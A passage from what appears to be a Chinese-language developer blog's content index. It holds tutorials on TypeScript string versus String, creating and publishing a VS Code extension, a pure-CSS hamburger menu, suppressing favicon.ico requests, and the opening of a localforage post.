方法根據任何指定區域語言環境設置的大小寫映射，返回調用字符串被轉換為小寫的格式 15. toLocaleUpperCase() toLocaleUpperCase() 方法根據本地主機語言環境把字符串轉換為大寫格式，並返迴轉換後的字符串 16. toLowerCase() toLowerCase() 會將調用該方法的字符串值轉為小寫形式，並返回 17. toString() 字符串對象的 toString() 方法返回一個字符串，表示指定的字符串 18. toUpperCase() toUpperCase() 方法將調用該方法的字符串轉為大寫形式並返回(如果調用該方法的值不是字符串類型會被強制轉換) 19. valueOf() valueOf() 方法返回 String 對象的原始值 程式碼對比 我們對下面4個變數進行型別的探索與比較：\n1 2 3 4 5 6 7 8 9 10 11 12 let msg: string = \u0026#39;Hello world!\u0026#39;; let msg2: String = \u0026#39;Hello world!\u0026#39;; let msg22 = \u0026#39;Hello world!\u0026#39;; // 字面上沒有定義型別 let msg3: String = new String(\u0026#39;Hello world!\u0026#39;); console.log(typeof(msg)); // string console.log(typeof(msg2)); // string console.log(typeof(msg22)); // string console.log(typeof(msg3)); // object console.log(msg === msg2); // true console.log(msg === msg3); // false console.log(msg2 === msg3); // false 為什麼需要 String 物件 首先，當我們使用關鍵字 new 新建一個 String 物件的時候，Typescript 會建立一個新的物件；\n即我們用 new 新建了兩個 String 物件，即使內容相同，它們也是指向不同的記憶體。\n舉下面兩個例子：\n當用 a1、b1 代表相同值的兩個變數的時候，它們是相同的；而當用 new 新建兩個物件的時候，即使值相同，它們也是不同的： 1 2 3 4 5 6 7 let a1 = \u0026#34;Hello World\u0026#34;; let b2 = \u0026#34;Hello World\u0026#34;; console.log(a1 === b1); // true let a2 = new String(\u0026#34;Hello World\u0026#34;); let b2 = new String(\u0026#34;Hello World\u0026#34;); console.log(a2 === b2); // false eval() 函式的作用：用來計算表示式的值。如果我們把 eval() 直接賦給 string，而 string 裡面是計算式的字串，那麼它會返回計算後的值；而如果我們把 eval() 賦給 String，因為它不是原生型別，它只會返回 String 這個物件： 1 2 3 4 5 6 let a3 = \u0026#34;3 * 9\u0026#34;; console.log(eval(a3)); // 27 let b3 = new String(\u0026#34;8 + 20\u0026#34;); console.log(eval(b3)); // Warning：Argument of type \u0026#39;String\u0026#39; is not assignable to parameter of type \u0026#39;string\u0026#39;. \u0026#39;string\u0026#39; is a primitive, but \u0026#39;String\u0026#39; is a wrapper object. Prefer using \u0026#39;string\u0026#39; when possible.ts(2345) console.log(eval(b3.toSTring())); // 28 其次，因為 String 物件可以有屬性。我們可以用 String 物件在屬性裡保留一個額外的值。即使這個用法並不常見，但是仍然是 TS 的一個特性： 1 2 3 4 5 6 let prim = \u0026#39;hello Wayne\u0026#39;; let obj = new String(\u0026#39;hello Wayne Cloud\u0026#39;); prim.property = \u0026#39;PaaS\u0026#39;; // Invalid obj.property = \u0026#39;PaaS\u0026#39;; // Valid console.log(obj.property); // 輸出為 PaaS 兩者區別總結 string 原生型別 String 物件 廣泛被使用 幾乎很少被使用 只會保留值 有能力除了值之外，還可以保留屬性 值是不可變的，因此執行緒安全 String物件是可變的 沒有任何方法 String物件有各種方法 不能建立兩個獨立的字面上值相同的 string 可以用 new 建立兩個物件 是原生的資料型別 包裝原生資料型別來建立一個物件 傳遞的值是原生資料本身的拷貝 傳遞的值是實際資料的引用 當使用 eval() 函式時，將直接作為原始碼進行處理 當使用 eval() 函式時，將被轉換為字串 ","date":"2022-11-28T00:00:00Z","image":"https://live.staticflickr.com/65535/52549840532_0ea4bef6e7_o.png","permalink":"https://wayneblog.ga/2022-11-28/ts-string-type-vs-class/","title":"TypeScript 裡 string 和 String，還真不僅僅是大小寫的區別！"},{"content":" 參考網站\n參考網站\n參考網站\n前言 VScode 使用者一定會安裝各種 Extension 來建立一個適合自己的開發環境，而這些強大的 Extension 大部分都由世界各地的愛用者開發並發布(publish) ，一切都是為了要讓 VSCode 更加實用上手甚至美觀。\n這篇就是要分享如何建立並發佈一個 Extension，英文程度不錯的建議直接閱讀官方文件，會有更加詳細的解說\n開發環境配置 在開始前，請照下方指示正確設置自己的環境。\n確認已安裝 nodejs 與 npm 1 node -v \u0026amp;\u0026amp; npm -v 如未安裝兩者，請先至 Nodejs 官方網站 下載。npm 會隨著 nodejs 下載一併被安裝，有時候您可能使用過舊的 npm，這時您可以使用以下指令更新它到最新版。\n1 npm install -g npm@latest 如果正確安裝了以上兩者，會跳出兩行版本號資訊。\nexport： 1 2 v16.15.0 8.15.1 安裝 yoman Yoman 是一款流行已久的code generator，可以允許我們使用yoman設置專案的樣板， 並讓我們使用 yo 指令快速產生樣板專案。\nVSCode 官方已經發布了 VSCode Yoman 專案，並且定期更新，因此我們可以直接使用 yo 指令產生 VSCode Extension，無需手動開發 yoman 樣板。\n請使用以下指令安裝yoman與VSCode Extension Generator：\n1 npm install -g yo generator-code 安裝 yoman 後，再次使用版本號指令確認有無正確安裝：\n1 yo --version 使用 yo 快速產生第一個 Extension 專案 首先，於 terminal 進入一個要放置專案的資料夾後，使用指令：\n1 yo code generator 會跳出提示，讓我們選擇要產生的 extension 種類：\n這些 Extension 選項的描述與說明如下：\nExtension 選項 描述 New Extension(Typescript) 產生使用typescript開發的extension專案 New Extension(Javascript) 產生使用javascript開發的extension專案 New Color Theme 配置VSCode介面顏色的擴充套件專案(詳見: Color Theme) New Language Support 程式語言(Programming Languages)擴充套件 New Code Snippets 程式碼片段擴充套件 New Keymap 快捷鍵擴充套件，keymap讓使用者得以在vscode中使用vim、sublime等等不同編輯器的快捷鍵開發。 New Extension Pack 打包多個已發佈的extension，讓使用者一鍵快速安裝。 New Language Pack (Localization) 配置VSCode編輯器多國語氣的擴充套件。 我們依序輸入如下：\nWhat type of extension do you want to create?\n選擇你要建立的專案類型\n這邊我選擇第一個 New Extension(Typescript) 選項\nWhat’s the name of your extension?\nExtension 名稱: 對應到 package.json \u0026ldquo;displayName\u0026rdquo;\n這裡我輸入： wconvert\nWhat’s the identifier of your extension?\n識別碼：對應到 package.json \u0026ldquo;name\u0026rdquo;\n這裡我輸入： wconvert\nWhat’s the description of your extension?\n描述: 對應到 package.json \u0026ldquo;description\u0026rdquo;\n這裡我輸入： my first vscode extension practice.\nInitialize a git repository?\n是否要使用 git\nBundle the source code with webpack?\n是否要使用 webpack 做原始碼的 bundle\nWhich package manager to use?\n要使用哪個套件管理工具\n讓子彈飛一會兒，最後 generator 會詢問是否使用 vscode 打開，這邊選擇打開。\nExtension 專案重點相關檔案介紹 打開後，我們會看到一個 nodejs 的 typescript 專案，結構如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ├── .vscode │ ├── extensions.json │ ├── launch.json │ ├── settings.json │ └── tasks.json ├── node_modules ├── src │ ├── extension.ts │ └── test │ ├── runTest.ts │ └── suite │ ├── extension.test.ts │ └── index.ts ├── .eslintrc.json ├── .gitignore ├── .vscodeignore ├── CHANGELOG.md ├── README.md ├── package-lock.json ├── package.json ├── tsconfig.json └── vsc-extension-quickstart.md .vscode/*： workspace 設定 檔案名稱 說明 task.json 設定 defaultBuild Task，用於 compile extension 專案的 typescript 程式。 launch.json 配置 debug mode 的兩個選項：Run extension 與 Test extension，用於執行 extension 主程式與相關測試程式，程式執行前，會先執行 defulat buildTask。 settings.json extension 專案的設定檔，此處的設定會覆蓋 user settings 跟 default settings。 extensions.json 設定用於輔助 extension 專案安裝的 extension recommendations list，此處推薦安裝 eslint extension。 src/extensions.ts： 主程式檔案 src/test.ts： 測試程式檔案 .eslintrc.json： 用於 extension 專案的 eslint 設置 .vscodeignore： 用於忽略不打包進發布套件的專案檔案 tsconfig.json： 用於專案 ts compiler 的設定選項 package.json： 用於配置 node 相關依賴與相關 npm script，在 extension 專案裡，package.json 亦用於配置 extension 重要相關設定 (詳見: Extension Manifest) vsc-extension-quickstart.md： 產生的 extension 專案的 markdown 說明文件 Extension 專案程式簡介 讓我們打開 extension.ts 吧，打開後可以看見 extension.ts 裡面有個 active function 跟 deactive function。\nactive function 為 extension 程式的進入點。當 extension 被 active 事件啟動時，即會執行 extension 程式。\n因此我們可以查看 pakcage.json，package.json 配置了 activeEvents 清單，可以看到清單裡列出跟active 有關的設定 activationEvents。\npackage.json 1 2 3 4 5 6 7 { // ... \u0026#34;activationEvents\u0026#34;: [ \u0026#34;onCommand:wconvert.helloWorld\u0026#34; ], // ... } activationEvents 指定了一個 hello world command，此即是說，當使用者執行 hello world command 時，extension 即會活躍並執行 active function。\n此處的 onCommand 語法為：\n1 onCommand: ${commandId} 那麼，command 的 id 是在哪裡配置的呢？\n一樣是在 package.json 裡，我們可以到 contributes 屬性 (Contribution Point: 詳見 Contribution Point) 下面查看：\npackage.json 1 2 3 4 5 6 7 8 9 10 11 12 { // ... \u0026#34;contributes\u0026#34;: { \u0026#34;commands\u0026#34;: [ { \u0026#34;command\u0026#34;: \u0026#34;wconvert.helloWorld\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;Hello World\u0026#34; } ] }, // ... } 可以看到在 contrubutes 屬性下面已經配置了 commands 清單，裡面條列著一個 command 設定，此處 command 設定的語法為：\n1 2 3 4 5 6 7 { /** * 被產生的Command會預設使用extension的id作為namespace，亦可自訂其他Namespace名稱 */ \u0026#34;command\u0026#34;: ${自定義的command-id}, \u0026#34;title\u0026#34;: ${Command的標題內容} } 當我們使用 Command Palette (Cmd/Ctrl + Shift + P) 搜尋 Command 並執行時，是使用 Command 的 Title 搜尋。\n好，現在我們已經了解如何在 Contribution Point 設定簡單的 Command id 跟 title，以及設定它為活躍 extension 的 event。現在回到 extension.ts 的 active function 吧！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 export function activate(context: vscode.ExtensionContext) { // Use the console to output diagnostic information (console.log) and errors (console.error) // This line of code will only be executed once when your extension is activated console.log(\u0026#39;Congratulations, your extension \u0026#34;wconvert\u0026#34; is now active!\u0026#39;); // The command has been defined in the package.json file // Now provide the implementation of the command with registerCommand // The commandId parameter must match the command field in package.json let disposable = vscode.commands.registerCommand(\u0026#39;wconvert.helloWorld\u0026#39;, () =\u0026gt; { // The code you place here will be executed every time your command is executed // Display a message box to the user vscode.window.showInformationMessage(\u0026#39;Hello World from wconvert!\u0026#39;); }); context.subscriptions.push(disposable); } 我們可以看到，active function 裡面在 extenions 活躍後將註冊我們在 Contribution Point 那邊設定的 command id，並且有一個 callback 函式，當我們配置的 command 執行之後，即會在 vscode 裡跳出顯示「Hello World from day05-first-command!」的訊息。\n這個註冊過後的 command 函式 (disposable) 會再 push 進 extension context 裡面，如此當 extension 被關閉後，VSCode 就可以自動釋放 listen 這個 command 的相關資源。\n執行 extension 專案應用程式 讓我們來執行 extension 吧，vscode 專案已經幫我們配置好了 lanunch.json，因此我們可以在 debug mode 裡執行 extension。讓我們點開「Run and Debug」，再點擊 sidebar 上方的 Run Extension 旁的執行按鈕開始 extension 吧！(此處的快捷鍵為 F5)\n執行後，vscode 會開啟一個新的 vscode 的 window 視窗，window 視窗上的 title 會註明這個視窗為 [Extension Development Host] 並預設載入 extension 了，我們可以在這個視窗操作我們開發中的 extension，並且使用中斷點偵錯。\n檢查已被註冊的 command 先來檢查一下剛才註冊的 command，在 Contribution Point 裡宣告的 Command，一樣在 Keyboard Shortcuts 下方可以搜尋的到。從 Manager \u0026gt; Keyboard Shortcuts 進入 Keyboard Shortcuts 頁中，並在搜尋條上輸入 wconvert，使用 extension id 來列出剛才註冊的 command。\n輸入後我們可以看到，Command 已正確被註冊。\n執行註冊後的 Command 現在，我們打開 Command Palette (快捷鍵：Cmd/Ctrl + Shift + P)，輸入 hello world，使用註冊的 Command Title 查找到 command。\n然後，點擊下去，我們可以看到 vscode 的 window 正確跳出「Hello World from day05-first-command!」訊息。\n然後，我們回到原本專案的 Vscode Window，我們可以在專案的 debug console 檢視 active function 下面的 console.log 訊息。\n加入套件邏輯 這邊可以依照你的需求進行套件邏輯的開發，我只是寫來玩而已，此處參考即可！\n註冊自己想要使用的 Command 我打算製作以下幾個功能：\n輸入指定的時間格式，會在當前檔案指標位置插入產生的時間戳 輸入指定的時間格式，僅會在vscode 的 window 顯示 將選取起來的時間戳，轉換為指定時區的時間格式(這邊以 YYYY-MM-DD hh:mm:ss.milsecond 格式為主) 附上完成後的程式碼：\nextension.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 import * as vscode from \u0026#39;vscode\u0026#39;; export function activate(context: vscode.ExtensionContext) { const input = async (placeHolder: string) =\u0026gt; await vscode.window.showInputBox({ placeHolder }) || \u0026#39;\u0026#39;; function pad(num: string | number, size: number): string { num = num.toString(); while (num.length \u0026lt; size) { num = \u0026#34;0\u0026#34; + num; } return num; } // show timestamp at vscode Information Window function showTimestamp(datetime: string) { let timestamp: number | undefined = NaN; try { timestamp = new Date(datetime).getTime(); if (typeof timestamp !== \u0026#34;number\u0026#34; || isNaN(timestamp) || timestamp.toString() === \u0026#34;NaN\u0026#34;) { return askDateTime(); }; vscode.window.showInformationMessage(timestamp.toString()); } catch(e) { console.log(e); vscode.window.showErrorMessage(\u0026#34;Invalid Date.\u0026#34;); askDateTime(); } } // create input with asking DateTime async function askDateTime() { const fullDateTime = await input(\u0026#34;DateTime (format: YYYY-MM-DD hh:mm:ss.ms) (example: 2022-12-31 23:59:59.999)：\u0026#34;); if (fullDateTime) { showTimestamp(fullDateTime); } } // Insert timestamp at cursor position vscode.commands.registerTextEditorCommand(\u0026#34;wconvert.genTimestamp\u0026#34;, async (editor, edit) =\u0026gt; { const fullDateTime = await input(\u0026#34;DateTime (format: YYYY-MM-DD hh:mm:ss.ms) (example: 2022-12-31 23:59:59.999)：\u0026#34;); if (!fullDateTime) { return; } try { let timestamp = new Date(fullDateTime).getTime(); if (!isNaN(timestamp) \u0026amp;\u0026amp; typeof timestamp === \u0026#34;number\u0026#34; \u0026amp;\u0026amp; timestamp.toString() !== \u0026#34;NaN\u0026#34;) { editor.edit((editBuilder) =\u0026gt; { editor.selections.forEach((selectionItem) =\u0026gt; { editBuilder.insert(selectionItem.active, timestamp.toString()); }); }); } else { vscode.window.showErrorMessage(\u0026#34;Datetime convert failed.\u0026#34;); } } catch(e) { vscode.window.showErrorMessage(\u0026#34;Invalid Date.\u0026#34;); } }); // only show generated timestamp let generateTimestamp = vscode.commands.registerCommand(\u0026#34;wconvert.genTimestampJustShow\u0026#34;, askDateTime); // format timestamp to YYYY-MM-DD HH:mm:ss that selections let timestamp2DateTime = vscode.commands.registerTextEditorCommand(\u0026#34;wconvert.timestamp2dateTime\u0026#34;, async (editor, edit) =\u0026gt; { const offsetStr = await input(\u0026#34;Time zone (example: +8)：\u0026#34;); const offset = Number(offsetStr); editor.edit((editBuilder) =\u0026gt; { editor.selections.forEach((selectionItem) =\u0026gt; { try { const selection = editor.document.getText(selectionItem); let dateArr = new Date(parseInt(selection) - (-offset * 60 * 60 * 1000)).toISOString().split(\u0026#34;T\u0026#34;); const [YYYYMMDD, hhmmss] = dateArr; const [year, month, day] = YYYYMMDD.split(\u0026#34;-\u0026#34;); const [hour, minute, fullSecond] = hhmmss.split(\u0026#34;:\u0026#34;); const [second, millionSecondZ] = fullSecond.split(\u0026#34;.\u0026#34;); const millionSecond = millionSecondZ.replace(\u0026#34;Z\u0026#34;, \u0026#34;\u0026#34;); let fullDateTime = `\u0026#34;${year}-${pad(month, 2)}-${pad(day, 2)} ${pad(hour, 2)}:${pad(minute, 2)}:${pad(second, 2)}.${pad(millionSecond, 3)}\u0026#34;`; editBuilder.replace(selectionItem, fullDateTime); } catch (e) { vscode.window.showErrorMessage(\u0026#34;Invalid Date.\u0026#34;); } }); }); }); context.subscriptions.push(timestamp2DateTime, generateTimestamp); } export function deactivate() {} package.json 的 activationEvents 記得加上欲註冊使用的 command，也可直接使用 \u0026quot;*\u0026quot;，將全部的 command 暴露出去！\npackage.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 { \u0026#34;name\u0026#34;: \u0026#34;wconvert\u0026#34;, \u0026#34;displayName\u0026#34;: \u0026#34;wconvert\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;help you convert datetime value\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.3\u0026#34;, \u0026#34;icon\u0026#34;: \u0026#34;photo.jpeg\u0026#34;, \u0026#34;publisher\u0026#34;: \u0026#34;4006wayne\u0026#34;, \u0026#34;repository\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;git\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://github.com/wjdesign/vscode-extension-wconvert.git\u0026#34; }, \u0026#34;homepage\u0026#34;: \u0026#34;https://github.com/wjdesign/vscode-extension-wconvert/blob/master/README.md\u0026#34;, \u0026#34;pricing\u0026#34;: \u0026#34;Free\u0026#34;, \u0026#34;engines\u0026#34;: { \u0026#34;vscode\u0026#34;: \u0026#34;^1.73.0\u0026#34; }, \u0026#34;categories\u0026#34;: [ \u0026#34;Other\u0026#34; ], \u0026#34;activationEvents\u0026#34;: [ \u0026#34;onCommand:wconvert.timestamp2dateTime\u0026#34;, \u0026#34;onCommand:wconvert.genTimestamp\u0026#34;, \u0026#34;onCommand:wconvert.genTimestampJustShow\u0026#34; ], \u0026#34;main\u0026#34;: \u0026#34;./out/extension.js\u0026#34;, \u0026#34;contributes\u0026#34;: { \u0026#34;commands\u0026#34;: [ { \u0026#34;command\u0026#34;: \u0026#34;wconvert.timestamp2dateTime\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;WConvert: DateTime to timestamp\u0026#34; }, { \u0026#34;command\u0026#34;: \u0026#34;wconvert.genTimestamp\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;WConvert: Generate Timestamp\u0026#34; }, { \u0026#34;command\u0026#34;: \u0026#34;wconvert.genTimestampJustShow\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;WConvert: Generate Timestamp Only Show\u0026#34; } ] }, \u0026#34;scripts\u0026#34;: { \u0026#34;vscode:prepublish\u0026#34;: \u0026#34;npm run compile\u0026#34;, \u0026#34;compile\u0026#34;: \u0026#34;tsc -p ./\u0026#34;, \u0026#34;watch\u0026#34;: \u0026#34;tsc -watch -p ./\u0026#34;, \u0026#34;pretest\u0026#34;: \u0026#34;npm run compile \u0026amp;\u0026amp; npm run lint\u0026#34;, \u0026#34;lint\u0026#34;: \u0026#34;eslint src --ext ts\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;node ./out/test/runTest.js\u0026#34; }, \u0026#34;devDependencies\u0026#34;: { \u0026#34;@types/vscode\u0026#34;: \u0026#34;^1.73.0\u0026#34;, \u0026#34;@types/glob\u0026#34;: \u0026#34;^8.0.0\u0026#34;, \u0026#34;@types/mocha\u0026#34;: \u0026#34;^10.0.0\u0026#34;, \u0026#34;@types/node\u0026#34;: \u0026#34;16.x\u0026#34;, \u0026#34;@typescript-eslint/eslint-plugin\u0026#34;: \u0026#34;^5.42.0\u0026#34;, \u0026#34;@typescript-eslint/parser\u0026#34;: \u0026#34;^5.42.0\u0026#34;, \u0026#34;eslint\u0026#34;: \u0026#34;^8.26.0\u0026#34;, \u0026#34;glob\u0026#34;: \u0026#34;^8.0.3\u0026#34;, \u0026#34;mocha\u0026#34;: \u0026#34;^10.1.0\u0026#34;, \u0026#34;typescript\u0026#34;: \u0026#34;^4.8.4\u0026#34;, \u0026#34;@vscode/test-electron\u0026#34;: \u0026#34;^2.2.0\u0026#34; } } 範例 repo\nvsce 打包並發布 Extension，官方文件\n使用 vsce 來打包與發布我的 Extension\n首先全局安裝 vsce：\n1 npm i -g vsce 打包 1 vsce package 下完指令後，會因為沒有 LICENSE 檔案而詢問是否繼續，這邊選擇 Y 直接下一步即可。\n完成後會在指定位置產生一個 .vsix 檔案，此即為我的 Extensions。\n本地安裝我的 Extension 若只是要製作一個自己用的 extension，沒有打算發布到網上，到此步驟即可。\n於 VScode 的 Extensions 頁籤，選擇 Install from VSIX，選擇剛剛產生的 .vsix 檔，即可完成安裝，在 Extensions 的 INSTALLED 內即可看到自己的 extension。\n發布到 Marketplace 前的準備 記住！每次發佈都要幫版本號加一下！\npackage.json 1 2 3 4 5 { // ... \u0026#34;version\u0026#34;: \u0026#34;0.0.1\u0026#34;, // ... } vsce 要求 Personal Access Token 個人訪問金鑰，以下的步驟圖片來源為官方說明文件\n首先請到 https://dev.azure.com/ 申請帳號並登入，在右上角打開 Personal access tokens 頁面。\n點選 New Token 按鈕。\n給這個新 Token一個名字、過期時間，重點是 Organization 請選擇 All accessiable organization，點選 Custom defined 並點選 Show all scopes 打開所有選項。\n找到 Marketplace 項目勾選 Acquire 與 Manage 後點選 Create。\n然後你會得到一個 Token 請複製下來。\n建立發佈器 - Publisher 建立一個 Publisher 用來儲存發佈的 Token ，請在 package.json 中指定要使用的發佈器\u0026quot;publisher\u0026quot;: (publisher name)\npackage.json 1 2 3 4 5 { // ... \u0026#34;publisher\u0026#34;: \u0026#34;{your publisher name}\u0026#34;, // ... } 使用 Marketplace 後台建立 Publisher 請到 https://marketplace.visualstudio.com/manage/publishers/ 建立一個 Publisher。\n使用 vsce 指令建立 Publisher 1 vsce create-publisher (publisher name) 輸入剛剛的 Personal access token，vsce 將會記得這個 publisher 與 token 以方便快速發佈。\nToken 更新 在我們建立 token 時，token 是有效期的，當 token 過期時我們就需要以下這個指來更新 token：\n1 vsce login (publisher name) 發布方式(一)：使用 vsce 發布 extension 下指令發布到 Marketplace：\n1 vsce publish 使用 vsce show 確認 extension 的資訊：\n1 2 # vsce show {publisher name}.{extension id} vsce show 4006wayne.wconvert 也可以在 vsce publish 時直接指定 token：\n1 vsce publish -p \u0026lt;token\u0026gt; 發布方式(二)：使用 Marketplace 後台上傳，發布 extension 前往網址 https://marketplace.visualstudio.com/manage/publishers/，選擇剛剛創建的 Publisher。\n點選 New extension \u0026gt; Visual Studio Code，選擇剛剛 package 出來的 .vsix 檔案後上傳。\n上傳後等待驗證，驗證完畢後即可看到我的 extension：\n結語 到這裡我已經成功發佈我的第一個 Extension 了！\n這是我寫的第一個 Extension，功能很陽春，用途是產生指定時間的時間戳與時間戳轉回指定時區的時間格式。\n非常推薦使用 Typescript 會比較容易開發，不然要查官方API會看得很痛苦，畢竟範例不多或者都要下載才能看。\n實際撰寫時會遇到 VScode API 到底有哪些功能可以使用的問題，甚至要去了解 VScode 的設計結構！\n常見問題 Extension validation error 出現如圖的問題，自行排查 extension 程式碼後發現非程式碼邏輯的問題，可以上 issues 將資訊反應給 vsmarketplace，此可能為 marketplace 驗證 extension 時偵測到特定字元組合而阻擋掉，會專人協助處理。\n附上本人遇到此問題的 Issues\n","date":"2022-11-22T00:00:00Z","image":"https://live.staticflickr.com/65535/52516420035_bc4b9df19c_o.png","permalink":"https://wayneblog.ga/2022-11-22/create-own-vscode-extension/","title":"今天來搞一個屬於自己的 VScode Extension 吧！"},{"content":" 參考網站\n前言 選單一直是製作網頁最基本的功能需求之一，因此對於許多的套件內建都會提供選單的功能，且這些滑動式選單，大部分都是透過 Javascript 所製作而成，最主要的原因就在於，透過 Javascript 可以精準的知道，目前使用是點選開啟還是關閉。\n而最近發現一個超酷的寫法，直接透過 HTML 中的核許框，就可判斷目前是開啟還是關閉，再搭配 CSS 就可實作出展開與收合，甚至連漢堡選單的那圖示，也可透過 CSS 繪製出來，且當選單開啟時，還可透過動畫將選單變叉叉的圖示，因此現在就一塊來看看，如何透過純 CSS 打造出開合式漢堡選單吧！\n做法 1. 加入以下的 HTML 架構 首先，先在HTML中加入以下的HTML架構。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;nav class=\u0026#34;nav-box\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; id=\u0026#34;menu\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;menu\u0026#34; class=\u0026#34;line\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;menu\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/label\u0026gt; \u0026lt;div class=\u0026#34;menu-list\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;選單1\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;選單2\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;選單3\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; 2. 加入 CSS 設定漢堡選單的圖示 接著再透過CSS來設定漢堡選單的圖示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /* 選單線 */ .line { width: 24px; height: 24px; background: #FFF; cursor: pointer; display: block; padding: 16px; position: fixed; z-index: 2; } .line .menu, .line .menu::before, .line .menu::after { background: #222; content: \u0026#39;\u0026#39;; display: block; height: 1px; position: absolute; transition: background ease .15s, top ease .15s .15s, transform ease .15s; width: 20px; } .line .menu { left: 18px; top: 27px; } .line .menu::before { top: -6px; } .line .menu::after { top: 6px; } 3. 加入 :checked 屬性的判斷 接著再透過 :checked 的屬性，來判斷目前為開啟狀態，當選單開啟時，原來的三條線就變成叉叉。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* 點選選單變叉叉 */ #menu:checked + .line .menu { background: transparent; } #menu:checked + .line .menu::before { transform: rotate(45deg); } #menu:checked + .line .menu::after { transform: rotate(-45deg); } #menu:checked + .line .menu::before, #menu:checked + .line .menu::after { top: 0; transition: top ease .15s, transform ease .15s .15s; } 4. 設定開合樣式 當選單按鈕處理好後，一樣用 :checked 來設定選單展開(200px)與收合(60px)。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 /* 選單開合 */ #menu:checked ~ .menu-list { width: 200px; } .menu-list { width: 60px; height: 100vh; background: #FFF; box-shadow: 0 2px 4px rgba(0, 0, 0, .1); padding-top: 60px; position: fixed; z-index: 1; transition: all .3s; overflow: hidden; } /* 選單向外推 */ .menu-list ul { list-style: none; margin-left:70px; padding: 0; } .menu-list ul\u0026gt;li{ display:block; width:100px; } 5. 隱藏 checkbox 都弄好後，再把 input 的核許框給隱藏起來，這樣就可透過純CSS打造出滑動式的漢堡選單啦！\n範例預覽 See the Pen blog/pure-css-toggle-menu-icon by wjdesign (@WJDesign) on CodePen. ","date":"2022-11-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52514242955_fd814a2b16_o.gif","permalink":"https://wayneblog.ga/2022-11-21/pure-css-toggle-menu-icon/","title":"免JS！純CSS就可打造出，開合式的漢堡選單功能"},{"content":" 參考網站\n問題原因 瀏覽器初到新網站時，會試著下載名為 Favicon (Favorite Icon) 的網站代表圖示，用在地址列、頁籤、書籤(我的最愛)上。\n若網頁沒特別指定，瀏覽器預設會抓取網站根路徑的 /favicon.ico 檔案，找不到就算了不會觸發錯誤。\n一般我們不為會為測試、開發用網站設計圖示，但瀏覽器仍會在第一次存取時嘗試下載 /favicon.ico，不意外地以 HTTP 404 收場：\n嚴格來說，瀏覽器會記住結果，404 失敗只會發生一次(直到瀏覽器重啟)，大小 5KB 說來無傷大雅。但它最困擾我的地方是使用 F12 網路工具或 Fidder 抓封包時，觀察結果天下飛來一筆 /favicon.ico 404，說明時還要額外解釋，蠻煩人的。\n解決方式 爬文查了避免瀏覽器抓 /favicon.ico 的方法，有以下幾種：\nFirefox 25+ 不支援 1 \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;data:image/x-icon;,\u0026#34; type=\u0026#34;image/x-icon\u0026#34;\u0026gt; 有些舊瀏覽器不支援 (Android Lollipop) 1 \u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;data:,\u0026#34;\u0026gt; 註：若有設定 Content-Security-Policy default-src \u0026lsquo;self\u0026rsquo; 會封限 data:image/png \u0026hellip; 來源，需調整為 default-src 'self' data: 參考 1 \u0026lt;link rel=\u0026#34;icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;data:image/png;base64,iVBORw0KGgo=\u0026#34;\u0026gt; 結論 結論：若只考慮 Chrome，三種做法均可避免瀏覽器嘗試存取 favicon.ico，第三種做法涵蓋瀏覽器最廣。\n","date":"2022-11-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52513251827_7a73de7710_o.png","permalink":"https://wayneblog.ga/2022-11-21/prevent-invalid-favicon/","title":"避免無效 favicon.ico 存取動作"},{"content":" 參考網站\nlocalStorage 是前端本地儲存的一種，其容量一般在 5M-10M 左右，用來快取一些簡單的資料基本夠用，畢竟定位也不是大資料量的儲存。\n在某些場景下 localStorage 的容量就會有點捉襟見肘，其實瀏覽器是有提供大資料量的本地儲存的如 IndexedDB 儲存資料大小一般在 250M 以上。\n彌補了 localStorage 容量的缺陷，但是使用要比 localStorage 複雜一些 mdn IndexedDB\n不過已經有大佬造了輪子封裝了一些呼叫過程使其使用相對簡單，下面我們一起來看一下～\nlocalforage localforage，擁有類似 localStorage API，它能儲存多種型別的資料如 Array、ArrayBuffer、Blob、Number、Object、String，而不僅僅是字串。\n這意味著我們可以直接存 物件、陣列型別的資料避免了 JSON.stringify 轉換資料的一些問題。\n儲存其他資料型別時需要轉換成上邊對應的型別，比如 vue3 中使用 reactive 定義的資料需要使用 